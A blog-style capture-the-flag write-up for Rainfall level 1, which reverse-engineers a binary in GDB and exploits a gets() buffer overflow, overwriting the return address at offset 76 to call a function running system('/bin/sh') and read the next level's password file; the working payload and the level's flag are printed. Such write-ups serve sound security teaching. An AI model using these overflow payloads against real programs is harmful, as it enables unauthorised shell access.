---
title: "[CTF] Rainfall Level 1: Buffer Overflow via 'gets'"
date: 2023-04-15 15:05:19
type: blog
tags: [blog, it, c, asm, ctf, exe, rainfall]
description: "Learn how to reverse engineer an executable by reading the Assembly code and exploit a 'gets' vulnerability using a buffer overflow attack."
image: "/assets/ctf/lvl1-og-image.jpeg"
---

This executable is the second challenge from the ISO file provided in the CTF. For more context, please visit [this repository](https://github.com/aallali/42-rainfall).

We retrieve the assembly code using GDB:
```
level1@RainFall:~$ gdb ./level1
```

## Notes
```c
0x08048444  run : function not called in main
0x08048480  main
```

## 0x08048480: main() Disassembly

_Note: Converting `hex` to `dec` and assigning variable names to make the code more readable._

```c
{
    int argc = ebp+0x8
    char **argv = ebp+12

    char *buffer1[80-16=64] = esp+16
}
```

**`<0> ➜ <+6>`: Prepare stack frame for function with size 80**
```c
0x08048480 <+0>:	push   ebp
0x08048481 <+1>:	mov    ebp,esp
0x08048483 <+3>:	and    esp,0xfffffff0
0x08048486 <+6>:	sub    esp,80
```

**`<+9> ➜ <+16>`: Take input from user and save it into `buffer1` using `gets()`**
```c
0x08048489 <+9>:	lea    eax,[buffer1]
0x0804848d <+13>:	mov    DWORD PTR [esp],eax
0x08048490 <+16>:	call   0x8048340 <gets@plt>
```

**`<+21> ➜ <+22>`: Exit the main function**
```c
0x08048495 <+21>:	leave  
0x08048496 <+22>:	ret 
```

## Stack Illustration (main function)

With the following input: `A * 76 + B * 4`

```shell
+-------------------+ 
[      **argv       ]
+-------------------+ +12
[        argc       ]
+-------------------+ +8
[ret addr (OLD_EIP) ] <--- EIP      BBBB <- offset of buffer Overflow
+-------------------+ +4            AAAA <- A * 76 times
[      OLD_EBP      ]               AAAA
+-------------------+ <---EBP       AAAA 
[and esp,0xfffffff0 ] <--- stack alignement 
+-------------------+               AAAA
[      AAAA         ]               AAAA
+-------------------+ +80  <------+ AAAA   ^
[      AAAA         ]             | AAAA   |
+-------------------+ +76         | AAAA   |
[      AAAA         ]             | AAAA
+-------------------+ +72         | AAAA
          *                       | AAAA
          *                       |----- size of buffer1 = 64 = (80 - 16)
          *                       | AAAA
+-------------------+ +24         | AAAA
[      AAAA         ]             | AAAA
+-------------------+ +20         | AAAA
[ start of buffer1  ]             | AAAA
+-------------------+ +16  <------+
[                   ]       
+-------------------+ +12         
[                   ]             
+-------------------+ +8           
[                   ]               
+-------------------+ +4          
[                   ]      
+-------------------+ <---ESP
```

## 0x08048444: run() Disassembly

_Note: Converting `hex` to `dec` and assigning variable names._

```c
// 0x18 ... 24
// 0x13 ... 19
```

**`<0> ➜ <+3>`: Prepare stack frame for function with size 24**
```c
0x08048444 <+0>:	push   ebp
0x08048445 <+1>:	mov    ebp,esp
0x08048447 <+3>:	sub    esp,24
```

**`<+6> ➜ <+41>`: Print "Good... Wait what?\n" on the screen with `fwrite`**
```c
0x0804844a <+6>:	mov    eax,ds:0x80497c0 // stdout
0x0804844f <+11>:	mov    edx,eax
0x08048451 <+13>:	mov    eax,0x8048570 // "Good... Wait what?\n"
0x08048456 <+18>:	mov    DWORD PTR [esp+12],edx
0x0804845a <+22>:	mov    DWORD PTR [esp+8],19
0x08048462 <+30>:	mov    DWORD PTR [esp+4],1
0x0804846a <+38>:	mov    DWORD PTR [esp],eax
0x0804846d <+41>:	call   0x8048350 <fwrite@plt>
fwrite("Good... Wait what?\n", 1, 19, stdout)
```

**`<+46> ➜ <+53>`: Call the shell process with `system("/bin/sh")`**
```c
0x08048472 <+46>:	mov    DWORD PTR [esp],0x8048584 // "/bin/sh"
0x08048479 <+53>:	call   0x8048360 <system@plt> // system("/bin/sh")
```

**`<+58> ➜ <+59>`: Leave the function / quit**
```c
0x0804847e <+58>:	leave  
0x0804847f <+59>:	ret 
```

## Stack Illustration

```c
+-------------------+ 
[      **argv       ]
+-------------------+ +12
[        argc       ]
+-------------------+ +8
[ret addr (OLD_EIP) ]
+-------------------+ +4
[      OLD_EBP      ]
+-------------------+ <---EBP
[and esp,0xfffffff0 ] <--- stack alignement 
+-------------------+ +24
[                   ]
[                   ] +24
[                   ]
[                   ] +20
[                   ] 
+-------------------+ +16
[       stdout      ]       
+-------------------+ +12         
[         19        ]             
+-------------------+ +8          
[          1        ]               
+-------------------+ +4          
[     "/bin/sh"     ]   <---  after caling system / before : will be  "Good... Wait what?\n"  
+-------------------+ <---ESP
```

## C Code Reconstruction

```c
function run () {

    fwrite("Good... Wait what?\n", 1, 19, stdout);

    system("/bin/sh");

    return ;

}
int main(int argc(ebp+0x8), char **argv(ebp+12)) {

    const buffer[64];

    gets(buffer);

    return;
}
```

## The Exploit Process

First, let's find the offset where the buffer overflow occurs:

1.  Using this [online tool](https://wiremask.eu/tools/buffer-overflow-pattern-generator/), we generate a pattern of length 100.
2.  Send the pattern to the program in GDB:
    `Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A`

```c
Starting program: /home/user/level1/level1 <<< "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A"

Program received signal SIGSEGV, Segmentation fault.
Error while running hook_stop:
No function contains program counter for selected frame.
0x63413563 in ?? ()
(gdb)
```

The program segfaulted, and `0x63413563` is the value that overwrote the EIP.

Entering `0x63413563` back into the tool reveals the offset is **76**.

Let's verify this by generating a custom pattern that should segfault at `0x42424242` ("BBBB"):
`python -c 'print "A" * 76 + "BBBB" '`

```c
(gdb) run <<< $(python -c 'print "A" * 76 + "BBBB" ')
Starting program: /home/user/level1/level1 <<< $(python -c 'print "A" * 76 + "BBBB" ')

Program received signal SIGSEGV, Segmentation fault.
Error while running hook_stop:
No function contains program counter for selected frame.
0x42424242 in ?? ()
(gdb)
```

As expected, we control the EIP.

Now, we need to replace `BBBB` with the address of the `run` function (`0x08048444`) to redirect execution. The address must be passed in **Little Endian** format.

*   Run address: `0x08048444`
*   Little Endian: `\x44\x84\x04\x08`
*   Python generation: `print "\x08\x04\x84\x44"[::-1]`

```c
(gdb) run <<< $(python -c 'print "A" * 76 + "\x08\x04\x84\x44"[::-1] ')
Starting program: /home/user/level1/level1 <<< $(python -c 'print "A" * 76 + "\x08\x04\x84\x44"[::-1] ')
Good... Wait what?

Program received signal SIGSEGV, Segmentation fault.
Error while running hook_stop:
No function contains program counter for selected frame.
0x00000000 in ?? ()
```

The `run` function was executed successfully!

## Solution

```bash
level1@RainFall:~$ (python -c 'print "A" * 76 + "\x08\x04\x84\x44"[::-1] ') > /tmp/ok
level1@RainFall:~$ cat /tmp/ok | ./level1 
Good... Wait what?
Segmentation fault (core dumped)
level1@RainFall:~$ 
```

The program segfaults because `stdin` closes immediately after the payload is sent. To fix this, we use `cat -` to keep the standard input open:

```shell
level1@RainFall:~$ cat /tmp/ok - | ./level1 
Good... Wait what?
whoami
level2
pwd
/home/user/level1
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

```info
The flag for this level is 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77.
```
## Resources
- [Buffer overflow, explained well honestly (VIDEO)](https://youtu.be/btkuAEbcQ80)
- [Buffer Overflow Examples, Overwriting a function pointer - protostar stack3 (ARTICLE)](https://0xrick.github.io/binary-exploitation/bof3/)
- [Call function in buffer overflow (StackOverflow)](https://stackoverflow.com/questions/30419081/call-function-in-buffer-overflow)
- [What is buffer overflow? (ARTICLE)](https://www.cloudflare.com/learning/security/threats/buffer-overflow/)
- [What is buffer overflow (VIDEO)](https://youtu.be/1S0aBV-Waeo)
- [Writing a Simple Buffer Overflow Exploit (VIDEO)](https://youtu.be/oS2O75H57qU)